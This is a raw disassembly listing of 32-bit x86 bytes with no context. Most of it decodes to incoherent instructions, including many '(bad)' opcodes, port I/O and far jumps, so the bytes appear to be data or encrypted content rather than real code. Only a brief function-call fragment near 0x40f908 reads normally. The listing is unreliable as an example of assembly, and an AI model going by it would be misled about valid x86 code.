  40f3c2:	lock jmp 0x40f423
  40f3c5:	imul   ebp,DWORD PTR [eax],0xffffffac
  40f3c8:	sbb    BYTE PTR [ecx-0x3d],ah
  40f3cb:	out    dx,al
  40f3cc:	adc    DWORD PTR [ecx+0x44588a0b],eax
  40f3d2:	fistp  QWORD PTR [ebp*2-0x4bf56a7a]
  40f3d9:	mov    ebp,0x7f0c398e
  40f3de:	mov    ds:0x6a3190c1,al
  40f3e3:	stc    
  40f3e4:	jmp    0x40f41d
  40f3e6:	das    
  40f3e7:	std    
  40f3e8:	adc    BYTE PTR [edx],ch
  40f3ea:	jnp    0x40f3f9
  40f3ec:	rol    DWORD PTR [esi-0x41],1
  40f3ef:	jl     0x40f40e
  40f3f1:	stos   BYTE PTR es:[edi],al
  40f3f2:	xchg   esi,eax
  40f3f3:	test   DWORD PTR [ecx+0x65],ebp
  40f3f6:	jmp    0xe24c:0xf38fedcc
  40f3fd:	repnz mov edi,0x398ffa3c
  40f403:	sub    BYTE PTR [edx+edx*4+0x46],dh
  40f407:	imul   ebx,DWORD PTR [ebx],0xffffff80
  40f40a:	push   ebp
  40f40b:	push   ebp
  40f40c:	jp     0x40f472
  40f40e:	or     DWORD PTR [edi+0x57502687],0x5d
  40f415:	mov    DWORD PTR [esi],eax
  40f417:	push   esi
  40f418:	pop    edx
  40f419:	mov    al,ds:0xd1f4d636
  40f41e:	hlt    
  40f41f:	lahf   
  40f420:	(bad)  
  40f421:	push   cs
  40f422:	jmp    0x40f40c
  40f424:	xchg   edx,eax
  40f425:	mov    eax,ds:0xc623bf1f
  40f42a:	inc    ebx
  40f42b:	(bad)  
  40f42c:	xchg   esp,eax
  40f42d:	push   es
  40f42e:	sti    
  40f42f:	dec    esp
  40f430:	mov    esi,0xbf2805af
  40f435:	adc    ebx,DWORD PTR ds:0xc8a60c40
  40f43b:	fwait
  40f43c:	ret    0x65d7
  40f43f:	inc    edx
  40f440:	or     bl,BYTE PTR [ecx-0x4b]
  40f443:	ss retf 0xd25d
  40f447:	test   BYTE PTR [ecx],ah
  40f449:	arpl   WORD PTR [eax],si
  40f44b:	loope  0x40f488
  40f44d:	mov    ah,0x4d
  40f44f:	nop
  40f450:	sbb    ebx,DWORD PTR [edi+0x27]
  40f453:	fcomp  DWORD PTR [ebx-0x26cdc124]
  40f459:	push   eax
  40f45a:	mov    ebp,0x1fcb4b2b
  40f45f:	lds    esi,FWORD PTR [edi]
  40f461:	rcr    bl,cl
  40f463:	pusha  
  40f464:	inc    esp
  40f465:	sbb    BYTE PTR [edx+edx*1],ah
  40f468:	pop    ebp
  40f469:	out    dx,eax
  40f46a:	pop    ebx
  40f46b:	leave  
  40f46c:	outs   dx,BYTE PTR ds:[esi]
  40f46d:	out    0x1d,al
  40f46f:	and    BYTE PTR [edx+ecx*4+0x2fa66cb3],al
  40f476:	pop    ebx
  40f477:	push   0x3b7214fc
  40f47c:	(bad)  
  40f47d:	leave  
  40f47e:	in     eax,0x8d
  40f480:	sar    BYTE PTR [edi],1
  40f482:	cmovg  eax,DWORD PTR [edi-0x4d9bddf2]
  40f489:	xchg   edx,eax
  40f48a:	adc    DWORD PTR [ecx],esp
  40f48c:	dec    edi
  40f48d:	cwde   
  40f48e:	dec    DWORD PTR [eax+0x52]
  40f491:	aam    0x80
  40f493:	call   0x25d522e0
  40f498:	popa   
  40f499:	cmp    bl,BYTE PTR [esi]
  40f49b:	cmp    eax,0x9a99541a
  40f4a0:	adc    DWORD PTR [ebx+edx*2],eax
  40f4a3:	js     0x40f48c
  40f4a5:	pop    esp
  40f4a6:	xor    eax,0xff3c29a5
  40f4ab:	cs ja  0x40f4d4
  40f4ae:	pop    eax
  40f4af:	inc    esp
  40f4b0:	adc    eax,0xcf7e2ac
  40f4b5:	(bad)  
  40f4b6:	sbb    ebx,DWORD PTR [ecx+0x5b1f5963]
  40f4bc:	inc    eax
  40f4bd:	(bad)  
  40f4be:	dec    BYTE PTR [eax-0x62]
  40f4c1:	push   ds
  40f4c2:	ror    DWORD PTR ds:0x24cc9ec9,1
  40f4c8:	sub    esp,esi
  40f4ca:	gs jo  0x40f47a
  40f4cd:	fld    QWORD PTR [eax-0x5a32a7a5]
  40f4d3:	ret    0x5492
  40f4d6:	push   eax
  40f4d7:	arpl   WORD PTR [eax-0xa3b67cc],bp
  40f4dd:	ret    
  40f4de:	cmp    dh,bh
  40f4e0:	mov    bh,0x16
  40f4e2:	push   0x30
  40f4e4:	mov    bh,0xc5
  40f4e6:	jecxz  0x40f4a7
  40f4e8:	xchg   esp,eax
  40f4e9:	loope  0x40f4ce
  40f4eb:	cmp    al,0x2f
  40f4ed:	sbb    ecx,DWORD PTR [eax+0x6b5923a]
  40f4f3:	xor    eax,0x19012fc3
  40f4f8:	jnp    0x40f4b6
  40f4fa:	mov    cl,0xfb
  40f4fc:	scas   eax,DWORD PTR es:[edi]
  40f4fd:	xor    BYTE PTR [ebx],dl
  40f4ff:	rcl    dh,cl
  40f501:	jmp    0x40f526
  40f503:	ins    BYTE PTR es:[edi],dx
  40f504:	adc    ebx,DWORD PTR ds:0xead96604
  40f50a:	outs   dx,DWORD PTR ds:[esi]
  40f50b:	pop    eax
  40f50c:	xor    esi,esi
  40f50e:	mov    DWORD PTR [ebp-0x14],ecx
  40f511:	mov    eax,DWORD PTR [ebp-0x28]
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   WORD PTR [edx],bx
  40f526:	dec    esi
  40f527:	call   0x70f0ab75
  40f52c:	jo     0x40f577
  40f52e:	jge    0x40f5a0
  40f530:	jo     0x40f532
  40f532:	test   eax,0xd6ce2f27
  40f537:	sub    eax,0x4f837d57
  40f53c:	adc    al,0x37
  40f53e:	and    BYTE PTR [ecx+ebp*1+0x44b2e12d],ch
  40f545:	daa    
  40f546:	sbb    DWORD PTR [esi+0x12aaf922],edi
  40f54c:	aaa    
  40f54d:	in     eax,0x16
  40f54f:	xchg   edx,eax
  40f550:	mov    eax,0x441dc428
  40f555:	fiadd  DWORD PTR [edi]
  40f557:	xor    al,0x9c
  40f559:	sbb    eax,DWORD PTR [edx+0x29fb2a6e]
  40f55f:	dec    esp
  40f560:	fld    DWORD PTR [esi]
  40f562:	je     0x40f558
  40f564:	adc    esi,ebp
  40f566:	push   edi
  40f567:	fmul   QWORD PTR [esi-0x3b]
  40f56a:	pop    ds
  40f56b:	in     al,0x5e
  40f56d:	cmp    eax,0x3c4e07dc
  40f572:	loope  0x40f540
  40f574:	xchg   ebx,eax
  40f575:	mov    dh,0x7e
  40f577:	rcr    DWORD PTR [eax-0xb],0xba
  40f57b:	rcl    DWORD PTR cs:[eax-0x5c],cl
  40f57f:	div    DWORD PTR [edx+0x56]
  40f582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f583:	cs push ss
  40f585:	push   0xffffffed
  40f587:	scas   al,BYTE PTR es:[edi]
  40f588:	ds and bl,cl
  40f58b:	out    0x8c,al
  40f58d:	lods   al,BYTE PTR ds:[esi]
  40f58e:	inc    eax
  40f58f:	mov    ch,0xee
  40f591:	sub    DWORD PTR [ecx-0xea27c4],esp
  40f597:	js     0x40f536
  40f599:	pop    ss
  40f59a:	sti    
  40f59b:	cdq    
  40f59c:	mov    eax,ds:0x10d111df
  40f5a1:	(bad)  
  40f5a2:	cld    
  40f5a3:	and    DWORD PTR [edx-0xfa2ef1c],ebp
  40f5a9:	lock mov dl,BYTE PTR [edx-0x135e7a84]
  40f5b0:	out    dx,al
  40f5b1:	fs mov ch,0x73
  40f5b4:	std    
  40f5b5:	sbb    DWORD PTR [edi-0x731a25eb],0x4a
  40f5bc:	(bad)  
  40f5bd:	cs pusha 
  40f5bf:	mov    BYTE PTR [eax],dl
  40f5c1:	pop    eax
  40f5c2:	loop   0x40f5fa
  40f5c4:	cmp    ebp,DWORD PTR [edi]
  40f5c6:	rol    BYTE PTR [edi],cl
  40f5c8:	xchg   ebp,eax
  40f5c9:	fcmovb st,st(5)
  40f5cb:	neg    BYTE PTR [ebx+esi*4]
  40f5ce:	popa   
  40f5cf:	xchg   ecx,eax
  40f5d0:	push   ds
  40f5d1:	out    dx,eax
  40f5d2:	pop    eax
  40f5d3:	push   es
  40f5d4:	mov    dl,0xf9
  40f5d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5d7:	pop    ebx
  40f5d8:	ss fwait
  40f5da:	rol    BYTE PTR [edi+0x51e91199],1
  40f5e0:	xor    al,ch
  40f5e2:	rol    ch,cl
  40f5e4:	push   eax
  40f5e5:	sbb    al,0x24
  40f5e7:	repnz imul eax,DWORD PTR [ebx-0x17c5a969],0x81e96a19
  40f5f2:	arpl   WORD PTR ds:0x7dc42c04,cx
  40f5f8:	xchg   edi,eax
  40f5f9:	inc    BYTE PTR [esi]
  40f5fb:	aaa    
  40f5fc:	cmp    esp,esp
  40f5fe:	ret    0x29c3
  40f601:	jne    0x40f5e1
  40f603:	xchg   ebx,eax
  40f604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f605:	xchg   ecx,eax
  40f606:	mul    BYTE PTR [ebx+0x74e721e0]
  40f60c:	xchg   esi,eax
  40f60d:	or     al,0xa2
  40f60f:	fs cmp eax,0xfd8cce40
  40f615:	adc    al,0x74
  40f617:	sub    eax,0x57b59ea9
  40f61c:	(bad)  [edi+0x43]
  40f61f:	mov    WORD PTR [esi+0x24d2b07f],es
  40f625:	sub    DWORD PTR [ecx],edx
  40f627:	stc    
  40f628:	scas   eax,DWORD PTR es:[edi]
  40f629:	ins    DWORD PTR es:[edi],dx
  40f62a:	sbb    BYTE PTR [eax+0x10],0x4b
  40f62e:	push   es
  40f62f:	fprem1 
  40f631:	push   edx
  40f632:	std    
  40f633:	mov    ds:0x47f6ea89,eax
  40f638:	icebp  
  40f639:	hlt    
  40f63a:	pop    esi
  40f63b:	stos   BYTE PTR es:[edi],al
  40f63c:	mov    eax,0x3457b1ba
  40f641:	cwde   
  40f642:	loop   0x40f607
  40f644:	add    eax,0xfd96e476
  40f649:	outs   dx,DWORD PTR ds:[esi]
  40f64a:	fdivrp st(3),st
  40f64c:	pop    ecx
  40f64d:	mov    edx,0xf793f5e0
  40f652:	test   BYTE PTR [ecx],bl
  40f654:	mov    dh,BYTE PTR [esi+0x9]
  40f657:	jnp    0x40f5d9
  40f659:	(bad)  
  40f65a:	jg     0x40f622
  40f65c:	js     0x40f628
  40f65e:	call   0x217176c
  40f663:	dec    eax
  40f664:	jmp    0x1ce1:0x6c99effa
  40f66b:	adc    edi,DWORD PTR ds:0xeb618269
  40f671:	scas   eax,DWORD PTR es:[edi]
  40f672:	or     cl,ch
  40f674:	cwde   
  40f675:	xor    eax,0xa93ab2a0
  40f67a:	ret    0x9737
  40f67d:	mov    eax,ds:0x18ac0991
  40f682:	enter  0x96b4,0x4d
  40f686:	neg    eax
  40f688:	fdivr  QWORD PTR [eax+0x7709e491]
  40f68e:	jno    0x40f613
  40f690:	retf   0xf416
  40f693:	es push es
  40f695:	sub    esp,DWORD PTR [edi+0x108a5f5e]
  40f69b:	inc    eax
  40f69c:	mov    bl,0x20
  40f69e:	shl    dh,0x54
  40f6a1:	bound  esp,QWORD PTR [edx]
  40f6a3:	or     BYTE PTR [edi+ecx*1],dl
  40f6a6:	or     edx,DWORD PTR [edx]
  40f6a8:	and    DWORD PTR [ebp-0x3e2263c4],esp
  40f6ae:	cmp    edi,edi
  40f6b0:	or     al,0xd6
  40f6b2:	lock and eax,0x170be048
  40f6b8:	sahf   
  40f6b9:	fisttp WORD PTR [edi+eiz*2]
  40f6bc:	inc    edi
  40f6bd:	jcxz   0x40f6a1
  40f6c0:	clc    
  40f6c1:	pop    ebp
  40f6c2:	loop   0x40f6a3
  40f6c4:	inc    ebp
  40f6c5:	pusha  
  40f6c6:	adc    bl,ch
  40f6c8:	xchg   ebp,eax
  40f6c9:	out    0x86,al
  40f6cb:	cmc    
  40f6cc:	mov    ds:0x6e125c62,eax
  40f6d1:	mov    esi,0x9cc51a14
  40f6d6:	push   ebp
  40f6d7:	sbb    BYTE PTR [edx+edi*2],ah
  40f6da:	inc    ebx
  40f6db:	sbb    al,0x88
  40f6dd:	mov    ebx,0x797069f0
  40f6e2:	loope  0x40f741
  40f6e4:	jae    0x40f6a4
  40f6e6:	inc    eax
  40f6e7:	mov    bl,BYTE PTR [eax]
  40f6e9:	inc    ebp
  40f6ea:	lods   eax,DWORD PTR ds:[esi]
  40f6eb:	ficomp WORD PTR cs:[edi]
  40f6ee:	(bad)  
  40f6ef:	fucomp st(0)
  40f6f1:	lods   al,BYTE PTR ds:[esi]
  40f6f2:	sub    eax,0xdaa0d889
  40f6f7:	adc    al,0x6a
  40f6f9:	pop    ebx
  40f6fa:	pop    edx
  40f6fb:	pop    ss
  40f6fc:	jbe    0x40f6a7
  40f6fe:	in     al,0x51
  40f700:	ror    DWORD PTR [eax],cl
  40f702:	push   0x7cc78464
  40f707:	and    BYTE PTR [edx+0x7e9e6631],al
  40f70d:	jnp    0x40f75b
  40f70f:	jg     0x40f6d9
  40f711:	std    
  40f712:	cs jae 0x40f77e
  40f715:	ins    DWORD PTR es:[edi],dx
  40f716:	iret   
  40f717:	cmp    BYTE PTR [eax+0x4],bh
  40f71a:	and    dl,BYTE PTR [eax+eiz*2-0x35945ba]
  40f721:	fs test al,0x48
  40f724:	jae    0x40f719
  40f726:	pop    edi
  40f727:	std    
  40f728:	pop    edx
  40f729:	sub    ch,BYTE PTR [edi+0x66e41c31]
  40f72f:	lea    ebx,[eax-0x30]
  40f732:	fs sbb eax,ecx
  40f735:	cmp    BYTE PTR [esi+0x6f],cl
  40f738:	fcmovne st,st(7)
  40f73a:	mov    esi,DWORD PTR [ebp-0x7a937ecd]
  40f740:	inc    esp
  40f741:	dec    esi
  40f742:	mov    ah,0xf7
  40f744:	mov    edx,0x20ae67f0
  40f749:	push   0x24
  40f74b:	aas    
  40f74c:	dec    ebp
  40f74d:	sub    eax,ebx
  40f74f:	adc    al,0xda
  40f751:	jg     0x40f79f
  40f753:	sub    eax,0xd65d9302
  40f758:	(bad)  
  40f759:	cmp    DWORD PTR [eax+0x69],esi
  40f75c:	mov    esp,0x77d7fdc5
  40f761:	call   0x8100cade
  40f766:	shr    BYTE PTR [edi],0xf2
  40f769:	mov    eax,0x40824cc2
  40f76e:	cmp    edi,DWORD PTR [eax+0x46]
  40f771:	add    DWORD PTR [ebx],ebx
  40f773:	lds    edx,FWORD PTR [ebx+ebp*4+0x5c]
  40f777:	adc    ah,BYTE PTR [esi-0x60475123]
  40f77d:	dec    ebx
  40f77e:	and    eax,0xf1611dbb
  40f783:	adc    BYTE PTR [eax-0x40],dh
  40f786:	ins    BYTE PTR es:[edi],dx
  40f787:	pop    esi
  40f788:	bound  eax,QWORD PTR [eax-0x78]
  40f78b:	mov    ?,WORD PTR [eax+0x6b7c3c1e]
  40f791:	rol    BYTE PTR [ebp-0x77],0xbe
  40f795:	or     bl,ch
  40f797:	push   esi
  40f798:	retf   
  40f799:	mov    bl,0xec
  40f79b:	pop    es
  40f79c:	mov    esp,0x4ee28557
  40f7a1:	fcom   st(6)
  40f7a3:	bound  ebx,QWORD PTR [ebx+0x4fe4ede7]
  40f7a9:	ret    0x44ed
  40f7ac:	cmp    al,0x27
  40f7ae:	shl    BYTE PTR [edx],0xa9
  40f7b1:	adc    al,dl
  40f7b3:	mov    ds:0x8b9ce84,eax
  40f7b8:	adc    eax,0xe4485788
  40f7bd:	pop    esi
  40f7be:	loope  0x40f7c0
  40f7c0:	cmp    dh,BYTE PTR ds:0x8764edd1
  40f7c6:	test   ecx,eax
  40f7c8:	inc    DWORD PTR [ebp-0x564fa85]
  40f7ce:	xor    BYTE PTR [ebx+0x387b2d67],bh
  40f7d4:	(bad)  
  40f7d5:	cli    
  40f7d6:	xchg   edi,eax
  40f7d7:	stos   DWORD PTR es:[edi],eax
  40f7d8:	outs   dx,BYTE PTR ds:[esi]
  40f7d9:	or     DWORD PTR [edi-0x756dd8eb],edi
  40f7df:	into   
  40f7e0:	cld    
  40f7e1:	mov    ch,ah
  40f7e3:	test   al,0x32
  40f7e5:	adc    DWORD PTR [ebp+0x1937e065],0x8510b6a9
  40f7ef:	ja     0x40f861
  40f7f1:	out    0x58,al
  40f7f3:	enter  0x66b7,0x79
  40f7f7:	cmp    ecx,esi
  40f7f9:	mov    BYTE PTR [esi-0x7c],ch
  40f7fc:	mov    ecx,0xb47a3713
  40f801:	addr16 adc al,0x17
  40f804:	pop    ds
  40f805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f807:	dec    ebp
  40f808:	ret    
  40f809:	ins    DWORD PTR es:[edi],dx
  40f80a:	iret   
  40f80b:	xor    eax,0xea002a36
  40f810:	push   esi
  40f811:	in     al,0x3a
  40f813:	(bad)  
  40f814:	aad    0x79
  40f816:	mov    BYTE PTR [edi+0x28],dh
  40f819:	fadd   DWORD PTR [esi]
  40f81b:	cld    
  40f81c:	std    
  40f81d:	pushf  
  40f81e:	or     BYTE PTR [esi+0x7d],dh
  40f821:	xor    eax,0xef390de9
  40f826:	les    edx,FWORD PTR [esi]
  40f828:	loop   0x40f847
  40f82a:	aas    
  40f82b:	xchg   edi,eax
  40f82c:	sar    esi,1
  40f82e:	sbb    esi,esp
  40f830:	jnp    0x40f84e
  40f832:	shl    DWORD PTR [ecx+eax*2-0x4c8baf8a],1
  40f839:	popf   
  40f83a:	cmp    BYTE PTR [edx],dh
  40f83c:	loopne 0x40f85d
  40f83e:	pop    ecx
  40f83f:	test   al,0x68
  40f841:	push   edx
  40f842:	adc    ah,dh
  40f844:	das    
  40f845:	outs   dx,BYTE PTR ds:[esi]
  40f846:	ret    0xd430
  40f849:	inc    bp
  40f84b:	or     BYTE PTR [ebx-0x3e8febaf],ch
  40f851:	out    dx,eax
  40f852:	ins    BYTE PTR es:[edi],dx
  40f853:	and    bh,BYTE PTR [eax+0x5a]
  40f856:	inc    edx
  40f857:	jle    0x40f85f
  40f859:	push   esp
  40f85a:	(bad)  
  40f85c:	ja     0x40f8c2
  40f85e:	xor    al,BYTE PTR [edi]
  40f860:	push   0x70
  40f862:	jns    0x40f8ce
  40f864:	in     al,dx
  40f865:	xor    esi,ebp
  40f867:	push   ebx
  40f868:	or     BYTE PTR [ecx+0x583e77cd],bl
  40f86e:	inc    esi
  40f86f:	mov    ?,WORD PTR [edx+edi*4]
  40f872:	ja     0x40f8ba
  40f874:	mov    al,ds:0x511deb00
  40f879:	mov    ebx,DWORD PTR [ebp-0x192dac2c]
  40f87f:	sbb    ch,BYTE PTR [eax-0x2a]
  40f882:	repz retf 
  40f884:	push   ds
  40f885:	jl     0x40f8aa
  40f887:	dec    edi
  40f888:	or     DWORD PTR [esi+0x5a],0x0
  40f88c:	mov    edi,0xcf9f8da2
  40f891:	mov    bh,0xfa
  40f893:	mov    cl,0x64
  40f895:	mov    eax,0xee669c24
  40f89a:	mov    al,0x62
  40f89c:	shl    DWORD PTR [ecx-0x36],1
  40f89f:	sub    DWORD PTR [eax-0x4a],ebp
  40f8a2:	cli    
  40f8a3:	adc    BYTE PTR [ebx+edi*4],cl
  40f8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a7:	aad    0x67
  40f8a9:	int3   
  40f8aa:	cmp    ebx,ecx
  40f8ac:	out    0xf8,eax
  40f8ae:	push   ebp
  40f8af:	dec    esp
  40f8b0:	sbb    al,al
  40f8b2:	test   al,0x79
  40f8b4:	in     al,dx
  40f8b5:	push   0xa9fd0193
  40f8ba:	add    eax,0x69b5733a
  40f8bf:	push   ds
  40f8c0:	imul   DWORD PTR ds:0xb5a470da
  40f8c6:	pop    edx
  40f8c7:	dec    ebx
  40f8c8:	xor    eax,0xe434ce3
  40f8cd:	mov    ebp,0x88b1ad1e
  40f8d2:	jg     0x40f886
  40f8d4:	enter  0x432f,0x45
  40f8d8:	jae    0x40f882
  40f8da:	pop    ds
  40f8db:	inc    ebx
  40f8dc:	retf   
  40f8dd:	push   esp
  40f8de:	cmp    DWORD PTR [ebx],esi
  40f8e0:	sbb    BYTE PTR [ebp+eiz*4+0x134632fb],bl
  40f8e7:	std    
  40f8e8:	inc    ebx
  40f8e9:	ins    BYTE PTR es:[edi],dx
  40f8ea:	popf   
  40f8eb:	xor    al,0x49
  40f8ed:	stos   BYTE PTR es:[edi],al
  40f8ee:	pop    ds
  40f8ef:	xchg   BYTE PTR [edi+0x27],bl
  40f8f2:	mov    bl,0xa9
  40f8f4:	add    ah,ah
  40f8f6:	jmp    0x40f94e
  40f8f8:	jne    0x40f963
  40f8fa:	jge    0x40f972
  40f8fc:	imul   edx,eax,0x67f25d2c
  40f902:	(bad)  
  40f903:	jp     0x40f979
  40f905:	fst    DWORD PTR [edx+0x6b]
  40f908:	mov    ecx,DWORD PTR [ebp+0x8]
  40f90b:	add    ecx,DWORD PTR [eax+edi*4]
  40f90e:	lea    eax,[ebp-0x8]
  40f911:	mov    DWORD PTR [ebp-0x30],ecx
  40f914:	push   eax
  40f915:	push   DWORD PTR [ebp-0x30]
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	sub    al,0xe9
  40f939:	sbb    DWORD PTR [ecx],ebx
  40f93b:	(bad)  
  40f93c:	stos   DWORD PTR es:[edi],eax
  40f93d:	jo     0x40f9af
  40f93f:	dec    ecx
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f8eb
  40f944:	call   0x75097879
  40f949:	clc    
  40f94a:	mov    dh,0x2c
  40f94c:	dec    edi
  40f94d:	adc    BYTE PTR [edi],dh
  40f94f:	cdq    
  40f950:	jbe    0x40f921
  40f952:	or     esp,edx
  40f954:	cdq    
  40f955:	xor    eax,0x786a60b8
  40f95a:	jmp    0xbb117caf
  40f95f:	imul   edi,eax,0x62
  40f962:	out    0xf,eax
  40f964:	not    DWORD PTR [edi-0x55]
  40f967:	ficom  WORD PTR [ebp+eiz*1+0x5f85dec4]
  40f96e:	mov    ch,0xfd
  40f970:	loop   0x40f9f0
  40f972:	repz (bad) 
  40f974:	adc    DWORD PTR [edi+0x13],esp
  40f977:	(bad)  
  40f978:	pop    esi
  40f979:	mov    ds:0x8c8ffb87,eax
  40f97e:	xlat   BYTE PTR ds:[ebx]
  40f97f:	add    bh,BYTE PTR [edx]
  40f981:	js     0x40f95b
  40f983:	bnd jge 0x40f9fa
  40f986:	xchg   esp,eax
  40f987:	xchg   ebp,eax
  40f988:	jl     0x40fa00
  40f98a:	pop    es
  40f98b:	dec    edi
  40f98c:	jne    0x40f983
  40f98e:	push   cs
  40f98f:	and    DWORD PTR [edi-0x7c],ebp
  40f992:	fcom   DWORD PTR [ecx+0x54]
  40f996:	cli    
  40f997:	gs jge 0x40f9d6
  40f99a:	inc    edx
  40f99b:	out    dx,al
  40f99c:	adc    eax,0x74ed4994
  40f9a1:	loopne 0x40f9a5
  40f9a3:	fdiv   QWORD PTR [edx+edx*2+0x32bdbdd0]
  40f9aa:	pusha  
  40f9ab:	dec    ebp
  40f9ac:	and    bh,BYTE PTR [edx-0x2aa17bbd]
  40f9b2:	fstp   TBYTE PTR [ecx]
  40f9b4:	arpl   WORD PTR [ebx+0x6f],cx
  40f9b7:	jg     0x40f9a6
  40f9b9:	xchg   BYTE PTR [ebx],ah
  40f9bb:	pusha  
  40f9bc:	and    eax,0xe6dc1a42
  40f9c1:	(bad)  
  40f9c2:	sahf   
  40f9c3:	add    DWORD PTR [eax+ecx*1+0x293d460d],edi
  40f9ca:	faddp  st(5),st
  40f9cc:	int3   
  40f9cd:	imul   edi,DWORD PTR [ecx-0x34],0xf58166cb
  40f9d4:	ror    DWORD PTR [ebp-0x114f8660],1
  40f9da:	js     0x40fa13
  40f9dc:	cmc    
  40f9dd:	jge    0x40fa1a
  40f9df:	scas   al,BYTE PTR es:[edi]
  40f9e0:	ret    
  40f9e1:	imul   eax
  40f9e3:	imul   esp,DWORD PTR [ecx+ecx*8+0x37],0x21
  40f9e8:	mov    dl,BYTE PTR [esi]
  40f9ea:	in     eax,0xe4
  40f9ec:	(bad)  
  40f9ed:	stc    
  40f9ee:	imul   esp,DWORD PTR [edi-0x2f],0x71
  40f9f2:	leave  
  40f9f3:	lods   eax,DWORD PTR ds:[esi]
  40f9f4:	sti    
  40f9f5:	adc    al,0xb4
  40f9f7:	xchg   edx,eax
  40f9f8:	mov    eax,ds:0xb03a9d1e
  40f9fd:	sub    eax,DWORD PTR [ecx+ecx*4-0x49]
  40fa01:	sub    BYTE PTR [ebx+0x5ceca423],0xf4
  40fa08:	lock or ebp,esi
  40fa0b:	jo     0x40f9d3
  40fa0d:	les    eax,FWORD PTR [ebx]
  40fa0f:	xchg   ebp,eax
  40fa10:	jge    0x40fa17
  40fa12:	sar    ebx,cl
  40fa14:	xlat   BYTE PTR ds:[ebx]
  40fa15:	fnstcw WORD PTR [eax+0x1cd0984f]
  40fa1b:	pusha  
  40fa1c:	push   esp
  40fa1d:	pop    edi
  40fa1e:	xchg   ebp,eax
  40fa1f:	out    0x64,eax
  40fa21:	fbld   TBYTE PTR [eax]
  40fa23:	daa    
  40fa24:	add    al,0x58
  40fa26:	arpl   WORD PTR [esi+0x433763aa],cx
  40fa2c:	push   ebx
  40fa2d:	jle    0x40faa1
  40fa2f:	sbb    al,0xe7
  40fa31:	adc    DWORD PTR [edx],esi
  40fa33:	cmp    edx,DWORD PTR [esi+0x50]
  40fa36:	ds out dx,eax
  40fa38:	test   BYTE PTR [edx],bh
  40fa3a:	cmp    eax,0xb137a0eb
  40fa3f:	test   BYTE PTR [esi+0x493faff3],dl
  40fa45:	cmp    ecx,DWORD PTR [ebx+0x71]
  40fa48:	pop    eax
  40fa49:	(bad)  
  40fa4a:	xchg   esi,eax
  40fa4b:	add    BYTE PTR [edx+0x1b78170d],cl
  40fa51:	cmp    esi,0x2c340dfb
  40fa57:	jne    0x40facb
  40fa59:	mov    eax,0x883cf0f7
  40fa5e:	xchg   esi,eax
  40fa5f:	les    edi,FWORD PTR [edx]
  40fa61:	mov    ebp,0xf73fbe36
  40fa66:	retf   
  40fa67:	mov    ah,0xbc
  40fa69:	mov    ebp,0x54cab1e3
  40fa6e:	jnp    0x40fa8d
  40fa70:	cmp    ecx,DWORD PTR [eax-0xa]
  40fa73:	push   ss
  40fa74:	add    DWORD PTR [edx],eax
  40fa76:	mov    bl,0x68
  40fa78:	add    eax,DWORD PTR [ecx-0xe]
  40fa7b:	push   0x95b58b04
  40fa80:	ins    DWORD PTR es:[edi],dx
  40fa81:	cld    
  40fa82:	ss mov ds,edi
  40fa85:	pop    ss
  40fa86:	push   edx
  40fa87:	jl     0x40fa93
  40fa89:	pop    ds
  40fa8a:	(bad)  
  40fa8b:	(bad)  
  40fa8d:	nop
  40fa8e:	jecxz  0x40fa3c
  40fa90:	pushf  
  40fa91:	retf   0x40b
  40fa94:	mov    eax,ds:0x4dd4f3c4
  40fa99:	sub    BYTE PTR [ebp+0x43],cl
  40fa9c:	push   0x5e4962b5
  40faa1:	test   BYTE PTR [edx],cl
  40faa3:	in     al,0x57
  40faa5:	sub    al,0xfe
  40faa7:	std    
  40faa8:	mov    WORD PTR [esi],ds
  40faaa:	ret    0xaae2
  40faad:	push   0x26e4d739
  40fab2:	retf   0xaf82
  40fab5:	push   eax
  40fab6:	sub    eax,0x66898081
  40fabb:	xor    al,0xaa
  40fabd:	dec    edi
  40fabe:	rcl    dl,0x85
  40fac1:	push   edx
  40fac2:	cmp    DWORD PTR [ebp+0x38],ebx
  40fac5:	ficomp DWORD PTR [eax]
  40fac7:	dec    ebp
  40fac8:	jno    0x40fb0d
  40faca:	push   cs
  40facb:	loope  0x40fadc
  40facd:	imul   ebx,DWORD PTR [edx-0x34543821],0xffffffde
  40fad4:	addr16 xor al,0x5d
  40fad7:	and    esp,DWORD PTR [edi]
  40fad9:	adc    eax,0x9b434386
  40fade:	shl    al,1
  40fae0:	push   ebx
  40fae1:	push   ds
  40fae2:	imul   ecx,DWORD PTR [ebp+0x76],0x77
  40fae6:	push   esi
  40fae7:	or     BYTE PTR [esi+0x14],0x4d
  40faeb:	stc    
  40faec:	(bad)  
  40faed:	psrlw  mm4,QWORD PTR [esi-0x32]
  40faf1:	stos   BYTE PTR es:[edi],al
  40faf2:	imul   edi,DWORD PTR [ecx],0x42
  40faf5:	sahf   
  40faf6:	shr    BYTE PTR [ebx+0x700b7d41],cl
  40fafc:	adc    bl,BYTE PTR [ebp+0x4724f1d8]
  40fb02:	sbb    al,0xdc
  40fb04:	imul   edx,DWORD PTR [ecx+0x3d],0x8c65e6c
  40fb0b:	sbb    ah,dl
  40fb0d:	add    dh,cl
  40fb0f:	(bad)  
  40fb10:	cmp    ch,BYTE PTR [edi]
  40fb12:	es mov ah,0xec
  40fb15:	jmp    0x700177e1
  40fb1a:	mov    bh,bl
  40fb1c:	les    esi,FWORD PTR [edx-0x8]
  40fb1f:	iret   
  40fb20:	int    0x51
  40fb22:	int3   
  40fb23:	clc    
  40fb24:	add    al,0xd4
  40fb26:	and    eax,0xdee0cf43
  40fb2b:	shl    BYTE PTR [edi],cl
